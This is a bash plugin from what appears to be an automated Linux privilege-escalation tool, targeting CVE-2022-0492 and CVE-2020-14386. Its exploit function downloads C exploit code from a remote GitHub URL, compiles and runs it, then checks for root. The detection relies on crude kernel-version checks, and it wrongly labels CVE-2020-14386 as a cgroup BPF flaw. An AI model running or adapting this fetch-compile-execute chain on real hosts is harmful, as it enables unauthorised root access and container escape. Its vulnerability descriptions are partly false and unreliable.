#!/bin/bash
# cgroup (CVE-2022-0492 / CVE-2020-14386) Plugin
PLUGIN_NAME="cgroup"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="CVE-2022-0492,CVE-2020-14386"
PLUGIN_DESCRIPTION="cgroup Local Privilege Escalation"

cgroup_detect() {
    log_message "Checking for cgroup vulnerability..." "INFO"
    
    local major=$KERNEL_MAJOR
    local minor=$KERNEL_MINOR
    
    # CVE-2022-0492: cgroup v1 release_agent
    if [ "$major" -ge 5 ]; then
        if [ -f "/proc/sys/kernel/unprivileged_userns_clone" ]; then
            local userns
            userns=$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)
            if [ "$userns" = "1" ]; then
                log_message "System may be VULNERABLE to cgroup escape" "WARNING"
                return 0
            fi
        fi
    fi
    
    # CVE-2020-14386: cgroup BPF
    if [ "$major" -eq 5 ] && [ "$minor" -ge 9 ]; then
        log_message "System may be VULNERABLE to cgroup BPF" "WARNING"
        return 0
    fi
    
    log_message "System NOT vulnerable to cgroup exploits" "INFO"
    return 1
}

cgroup_exploit() {
    log_message "Attempting cgroup exploitation..." "INFO"
    
    if ! cgroup_detect; then
        return 1
    fi
    
    local exploit_source="${EXPLOIT_DIR}/cgroup.c"
    local exploit_binary="${EXPLOIT_DIR}/cgroup"
    local exploit_url="${EXPLOIT_SOURCES[cgroup]}"
    
    [ -z "$exploit_url" ] && exploit_url="https://raw.githubusercontent.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492/main/exploit.c"
    
    if ! download_exploit "cgroup" "$exploit_url" "$exploit_source"; then
        log_message "Failed to download cgroup exploit" "WARNING"
        return 1
    fi
    
    if ! compile_exploit "$exploit_source" "$exploit_binary"; then
        log_message "Failed to compile cgroup exploit" "WARNING"
        return 1
    fi
    
    log_message "Running cgroup exploit..." "INFO"
    timeout_exec $TIMEOUT_CRITICAL "$exploit_binary" &
    spinner $!
    wait $! 2>/dev/null
    
    sleep 2
    if [ "$(id -u)" -eq 0 ]; then
        log_message "cgroup exploit SUCCESSFUL!" "SUCCESS"
        return 0
    fi
    
    log_message "cgroup exploit failed" "WARNING"
    return 1
}

cgroup_info() {
    cat << 'EOFINFO'
cgroup (CVE-2022-0492 / CVE-2020-14386)
=======================================
Vulnerabilities in the Linux kernel's cgroup subsystem that allow
local privilege escalation via release_agent or BPF.

Affected: Linux kernel 5.0+ (CVE-2022-0492), 5.9+ (CVE-2020-14386)
Impact: Local privilege escalation to root / Container escape
Discovery: Various
EOFINFO
}
